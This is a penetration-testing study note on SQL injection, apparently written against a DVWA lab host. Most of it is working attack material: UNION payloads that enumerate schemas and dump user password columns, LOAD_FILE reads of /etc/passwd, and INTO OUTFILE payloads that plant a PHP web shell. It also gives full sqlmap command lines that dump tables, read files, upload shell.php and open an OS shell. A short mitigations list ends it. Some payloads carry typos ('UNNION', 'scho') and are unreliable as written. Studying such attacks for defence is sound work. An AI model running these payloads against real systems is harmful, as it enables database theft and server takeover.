# SQL Injection

SQL Injection is where we can get more data or access to a database by modifying application logic and bypassing authentication. This can be achieved by modifying, inserting, or injecting crafted user input that provides more access than intended. 

A typical request might look like:
```sql
select * FROM users WHERE id='1';


UserID	Username	FirstName	LastName
12345	John	John	Red
```

SQL Injection then can could be the following:

```sql
SELECT * FROM Users WHERE id='1' or 1=1

UserID	Username	FirstName	LastName
12345	John	John	Red
20193	Sara1980	Sara	Lee
54920	Thomas12	Thomas	Green
```

### SQL Union

We can `UNION` two tables together with `SELECT * from Users UNION SELECT * from Administrators;`. 
This will select all records from USERS, and all records from Administrators. But what if they have mismatched columns? Then we can match just the select fields that are contained in both sets:
`SELECT username, password, userid from Users UNION SELECT username, password, userid from Administrators;`

How can we use this for exploitation?
We can enter a SQL statement like the following in a query field in a web application that executes SQL:

```sql
0' or 1=1 UNION SELECT null, version() #
```

In this case, we provide a `NULL` as a placeholder to not need to guess data types, and we simultaneously execute `version()`. The `#` is a delimiter.
```sql
# Return the current user and database 
0' or 1=1 UNION SELECT user(), database() #'

# Full query
SELECT first_name, last_name FROM users WHERE user_id = '0' or 1=1 UNNION SELECT user(), database() #;
```

We can get more details as needed with the following functions:
```sql
@@hostname : Current Hostname
@@tmpdir : Tept Directory
@@datadir : Data Directory
@@version : Version of DB
@@basedir : Base Directory
user() : Current User
database() : Current Database
version() : Version
schema() : current Database
UUID() : System UUID key
current_user() : Current User
```

We can also use UNION to return data from other tables and databases.  In order to do so, we need to see / read what other tables are available. This information is contained in the information_schema.tables:

```sql
SELECT * FROM Users WHERE id = '0' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables #

# List all columns from tables - returns table_name:column_name - 
or 1=1 UNION SELECT 1,concat(table_name,char(58),column_name) from information_schema.columns #
```

Armed with this information we can see that the `tiki_users` table has a column for `user` and a column for `password`.
```sql
0' or 1=1 UNION SELECT user,password from tiki_users #
```

### SQLi: Interacting with the File system

Under specific circumstances, we can interact with the underlying filesystem. 
We can use LOAD_FILE and OUTFILE to write to the filesystem, such as a web shell. 

```sql
SELECT * LOAD_FILE('/home/username/mytextfile.txt');

# Using union to read a passwd file
0' UNION SELECT 1, load_file('/etc/passwd') #
```

Using `OUTFILE` we can write web shells into a webroot directory and execute with a web browser:
```sql
SELECT * [fields] INTO OUTFILE '/tmp/output.txt'
# Write a php payload into /var/wwww
0' UNION SELECT '<?php phpinfo();?>', null INTO OUTFILE '/var/www/info.php' #'
# After we proof that its possible, lets get a web shell
0' UNION SELECT '<?php scho shell_exec($_GET[\'cmd\']); ?>', null INTO OUTFILE '/var/www/cmd.php' # 
# If we browse to /cmd.php?cmd=id then we can see the web shell was uploaded
```

### Securing against Filesystem Modification

The user running MySQLd should have very limited to no file directory access. 
Additionally, there should be FILE privileges, and kernel security modules like AppArmor and/or SELinux

## SQLMap

SQLMap allows us to automate the testing and exploitation of SQL Injection vulnerabilities. SQLMap has the ability to fingerprint the back-end database and test for various SQL injection flaws such as boolean-, time- and error based blind SQL injection. When a vulnerability is detected in a parameter, SQLMap can then exploit it to fetch database contents, access the filesystem, and possiby spawn an OS shell. Support MySQL, PostgrSQL, Microsoft SQL Server, Oracle, and others. 

We need to run sqlmap against a vulnerable URL that accepts SQL input; `--batch` allows default options without interruptions. 
`sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit-Submit#" --batch` 

If we tried this URL directly, we would be directed to a login page. We can remediate by providing it with a PHPSESSID cookie, and provide this to SQLMap. We can retrieve this using `Developer Tools -> Storage -> Cookies` 
We then re-submit the sqlmap query:

```shell
sqlmap -u " http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --banner
# Once we know the version of the back-end, we can pass this as a parameter to skip fingerprinting -
-dbms="MySQL 5.0"
```

Once we have successfully identified a vulnerable `id` parameter SQL injection, we can enumerate the rest of the database, tables, columns, users, and contents. We can see what is available using the enumeration section:

| Command        | Result                             |
| -------------- | ---------------------------------- |
| -a, --all      | Retrieve everything                |
| -b, --banner   | Retrieve DBMS Banner               |
| --current-user | Retrieve DBMS current user         |
| --current-db   | Retrieve DBMS current database     |
| --hostname     | Retrieve DBMS current hostname     |
| --is-dba       | Detect if DBMS current user is DBA |
| --users        | Enumerate DBMS users               |
| --passwords    | Enumerate password hashes          |
| --privileges   | Enumerate user privileges          |
| --roles        | Enumerate DBMS user roles          |
| --dbs          | Enumerate DBMS databases           |
| --tables       | Enumerate DBMS tables              |
| --columns      | Enumerate DBMS table columns       |
| --schema       | Enumerate DBMS schema              |

Lets get a list of databases on the server:
```shell
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dbs
# Once retrieved we can get a list of tables from the databases:
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --tables
# With the table details, we can see one for users.  Lets retrieve columns and determine what's available in this table?
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --columns --current-db
```

When we return columns, we can see interesting ones like usernames, and passwords. We can dump the table to view contents with the `-T <table name>`.
```shell
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dump --current-db -T users
# Returns passwords that were revealed in clear text
# We can also return password hashes and send to hashcat / john
```

### SQLMap Verbosity

We can modify the verbosity level of SQLmap by specifying `-v <#>`. The available options are:

* 0: Show only Python tracebacks, error and critical messages.
* 1: Show also information and warning messages.
* 2: Show also debug messages.
* 3: Show also payloads injected.
* 4: Show also HTTP requests.
* 5: Show also HTTP responses’ headers.
* 6: Show also HTTP responses’ page content.

### Downloading and Uploading with SQLMap

We can optionally interact with the filesystem (`sqlmap -hh` for details).
We can use:

* `--file-read=FILE`
* `--file-write=FILE`
* `--file-dest=FILE` 

How can we use this with SQLMap?
```shell
# Read /etc/passwd
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --file-read=/etc/passwd

# Create a PHP web shell
# file-write is a local path; file-dest is the target path
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --file-write="/tmp/shell.php" --file-dest="/var/www/shell.php"
```

### Achieving an OS-Shell

```shell
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --os-shell
```

### References

https://sqlmap.org/
https://github.com/sqlmapproject/sqlmap/wiki/Usage

### Mitigations

Most  SQL injection vulnerabilities can be easily avoided in your code. 
Most  vulnerabilities are introduced by using dynamic queries that entail some kind of user input.

- Use prepared statements with parameterized queries. Prepared statements are effective against SQL injection attacks when properly implemented.
- Use stored procedures. While not always safe from SQL injection they can be implemented in a safe way by using parameters instead of dynamic user input.
- Apply the principle of least privileges and permissions to database user accounts. Restrict access to databases and tables and functions will minimize the impact if the server is breached and limit an attacker’s privileges on the database server.
- Create a role for executing stored procedures with execute only rights instead of a role that has full rights.
- Validate all untrusted data, such as user input, by constraining and sanitizing all input server side. There are many ways to validate user input, a good start is to check the input for type, length and range. You should also blacklist characters that might pose a risk, or even better whitelist those characters allowed as user input. Use escape routines to handle special characters.
- Perform validation of untrusted data on the server side. Client-side validation can easily be circumvented using a browser and additional tools.
- Do not disclose error information by using structured exception handling.
- Encrypt sensitive data and use strong, secure hashing algorithms for passwords.
- Use a Web Application Firewall (WAF) 